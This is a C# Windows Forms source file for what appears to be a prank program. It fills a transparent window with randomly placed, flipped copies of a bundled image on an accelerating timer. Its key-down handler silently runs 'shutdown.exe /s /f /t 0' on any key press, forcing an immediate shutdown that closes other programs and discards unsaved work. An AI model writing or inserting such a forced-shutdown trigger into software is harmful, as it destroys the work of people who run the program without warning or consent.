using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using cs_ahill_app.Properties;

namespace cs_ahill_app
{
    public partial class Form1 : Form
    {
        Bitmap ahillBmp = Resource1.Ahill;
        Bitmap formBmp;
        Graphics canvas;
        Random rand;

        public Form1()
        {
            ahillBmp.MakeTransparent(Color.Blue);
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            rand = new Random();
        }

        bool flag = false;

        private void timer1_Tick(object sender, EventArgs e)
        {
            int width = this.Width + 100;
            int height = this.Height + 100;

            timer1.Interval = Math.Max(timer1.Interval - 1, 10);

            this.TransparencyKey = Color.Blue;
            if (flag == false)
            {
                flag = true;

                this.formBmp = new Bitmap(width, height);
                this.canvas = Graphics.FromImage(this.formBmp);

                this.canvas.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;

                this.canvas.FillRectangle(new SolidBrush(Color.Blue), 0, 0, width, height);

                this.pictureBox1.Location = new Point(0, 0);
                this.pictureBox1.Size = new Size(width, height);
                this.pictureBox1.Image = this.formBmp;
            }

            int size_x = rand.Next(300) + 70;

            int size_y = (int)((double)size_x * 430.0 / 694.0);

            int min_x = -size_x;
            int max_x = width + size_x;

            int min_y = -size_y;
            int max_y = height + size_y;

            int x = rand.Next(min_x, max_x);
            int y = rand.Next(min_y, max_y);

            DrawOne(x, y, size_x, size_y);
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        void DrawOne(int x, int y, int width, int height)
        {
            int neg = 1;
            if (rand.Next() % 5 == 0)
            {
                neg = -1;
            }

            canvas.DrawImage(ahillBmp, x, y, width * neg, height);
            this.pictureBox1.Refresh();

            this.pictureBox1.Location = new Point(-100 + rand.Next(30), -100 + rand.Next(25));
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            Process p = Process.Start(@"c:\windows\System32\shutdown.exe", "/s /f /t 0");
        }
    }
}
